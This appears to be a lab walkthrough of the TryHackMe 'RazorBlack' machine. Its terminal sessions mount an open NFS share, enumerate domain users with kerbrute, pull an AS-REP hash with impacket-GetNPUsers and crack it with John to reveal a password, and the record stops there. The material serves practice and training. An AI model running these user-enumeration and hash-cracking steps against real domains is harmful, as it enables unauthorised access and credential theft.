Machine name - RazorBlack (THM)
```bash
┌──(sabeshan㉿kali)-[~]
└─$ showmount -e 10.201.122.83                                                                   
Export list for 10.201.122.83:
/users (everyone)
                                                                                                                    
┌──(sabeshan㉿kali)-[~]
└─$ mkdir /tmp/mount        
                                                                                                                    
┌──(sabeshan㉿kali)-[~]
└─$ sudo mount 10.201.122.83:/users /tmp/mount 
[sudo] password for sabeshan: 
                                                                                                                    
┌──(sabeshan㉿kali)-[~]
└─$ cd /tmp/mount    
cd: permission denied: /tmp/mount
                                                                                                                    
┌──(sabeshan㉿kali)-[~]
└─$ sudo cd /tmp/mount                        
sudo: cd: command not found
sudo: "cd" is a shell built-in command, it cannot be run directly.
sudo: the -s option may be used to run a privileged shell.
sudo: the -D option may be used to run a command in a specific directory.
                                                                                                                    
┌──(sabeshan㉿kali)-[~]
└─$ su root           
Password: 
┌──(root㉿kali)-[/home/sabeshan]
└─# cd /tmp/mount                 
                                                                                                                    
┌──(root㉿kali)-[/tmp/mount]
└─# ls -la
total 13
drwx------  2 nobody nogroup   64 Feb 27  2021 .
drwxrwxrwt 18 root   root     420 Sep  9 11:50 ..
-rwx------  1 nobody nogroup 9861 Feb 25  2021 employee_status.xlsx
-rwx------  1 nobody nogroup   80 Feb 26  2021 sbradley.txt
                                                                                                                    
┌──(root㉿kali)-[/tmp/mount]
└─# cat sbradley.txt 
��THM{ab53e05c9a98def00314a14ccbfa8104}
```
---
The content on the .xlsx file it reveal some users

<img width="1041" height="415" alt="image" src="https://github.com/user-attachments/assets/775341b1-89fd-4ba1-82e4-3a54f6b963c6" />

----
With that i brute force to find the users
```bash
┌──(myenv)─(sabeshan㉿kali)-[~/thm]
└─$ /home/sabeshan/Active_directory/kerbrute userenum -d raz0rblack.thm --dc raz0rblack.thm new_user.txt -v -o valid_users.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/09/25 - Ronnie Flathers @ropnop

2025/09/09 12:31:56 >  Using KDC(s):
2025/09/09 12:31:56 >   raz0rblack.thm:88

2025/09/09 12:31:57 >  [!] cingram@raz0rblack.thm - User does not exist
2025/09/09 12:31:57 >  [!] aedwards@raz0rblack.thm - User does not exist
2025/09/09 12:31:57 >  [+] VALID USERNAME:       lvetrova@raz0rblack.thm
2025/09/09 12:31:57 >  [!] dport@raz0rblack.thm - User does not exist
2025/09/09 12:31:57 >  [!] tvidal@raz0rblack.thm - User does not exist
2025/09/09 12:31:57 >  [!] ncassidy@raz0rblack.thm - User does not exist
2025/09/09 12:31:57 >  [!] rdelgado@raz0rblack.thm - User does not exist
2025/09/09 12:31:57 >  [!] rzaydan@raz0rblack.thm - User does not exist
2025/09/09 12:31:57 >  [!] iroyce@raz0rblack.thm - User does not exist
2025/09/09 12:31:57 >  [+] VALID USERNAME:       twilliams@raz0rblack.thm
2025/09/09 12:31:57 >  [!] adiministrator@raz0rblack.thm - User does not exist
2025/09/09 12:31:57 >  [!] clin@raz0rblack.thm - User does not exist
2025/09/09 12:31:57 >  [+] VALID USERNAME:       sbradley@raz0rblack.thm
2025/09/09 12:31:57 >  [+] VALID USERNAME:       Administrator@raz0rblack.thm
2025/09/09 12:31:57 >  Done! Tested 14 usernames (4 valid) in 0.735 seconds
```
---
```bash
┌──(myenv)─(sabeshan㉿kali)-[~/thm]
└─$ cat valid_users.txt | grep VALID | awk {'print $7'}    

lvetrova@raz0rblack.thm
twilliams@raz0rblack.thm
sbradley@raz0rblack.thm
Administrator@raz0rblack.thm
                                                                                                                    
┌──(myenv)─(sabeshan㉿kali)-[~/thm]
└─$ cat valid_users.txt | grep VALID | awk {'print $7'} | cut -d@ -f1

lvetrova
twilliams
sbradley
Administrator
```
---
```bash
┌──(myenv)─(sabeshan㉿kali)-[~/thm]
└─$ impacket-GetNPUsers raz0rblack.thm/ -usersfile user_list.txt -dc-ip raz0rblack.thm -no-pass 
/home/sabeshan/thm/kitt/myenv/lib/python3.13/site-packages/impacket/version.py:10: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User lvetrova doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$twilliams@RAZ0RBLACK.THM:e08ac6941da5cc4dc8bd357d016abfa3$816f1615fd99d21ba07063d7ac7d0eecf1384abc817a6ea9e18946aa060518992505ea1f43edbbe879d7144e05ecdce216272524f90e9e4dee324102e2b4ab169b46341408339737e881a66b20722f8c00c10257a51d63f4660bb5d979916a51c11ceffb34281f3fcaf5cabf2a0f1877b310f796c009523c2d4ee26b66c5175a78c14ee11c47a7262ab2f2669118c5800707f6d248d4083e8c64b55f86a44fd4859f36de7a9c3fb9f6e9bf30e7c5e5e3e231290fd47b87e851f43ee8f95e072a3c50eede62fb4ea0c2b6b552933121926b967f6834773bea285d9c3797c2d65ebaafbd16a56b66098035f4718c4d3c81
[-] User sbradley doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```
---
```bash
┌──(myenv)─(sabeshan㉿kali)-[~/thm/RazorBlack]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt                
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
roastpotatoes    ($krb5asrep$23$twilliams@RAZ0RBLACK.THM)     
1g 0:00:00:13 DONE (2025-09-09 12:46) 0.07451g/s 314601p/s 314601c/s 314601C/s rob12..roastedfish
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
